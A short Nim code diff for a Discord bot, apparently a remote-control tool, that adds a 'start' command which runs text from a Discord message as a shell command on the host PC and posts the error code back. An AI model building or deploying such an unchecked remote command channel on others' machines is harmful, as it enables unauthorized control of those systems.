@@ -93,6 +93,17 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
             CHANNEL,
             THISPCSTR & "ran with err code: " & $errCode
           )
+        elif (command.startsWith("start")):
+          let cmd: string = command.split("start ")[1]
+
+          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "starting...")
+
+          let errCode = execShellCmd("start " & cmd)
+
+          discard await discord.api.sendMessage(
+            CHANNEL,
+            THISPCSTR & "ran with err code: " & $errCode
+          )
         elif (command.startsWith("say")):
           let text: string = command.split("say ")[1]
 
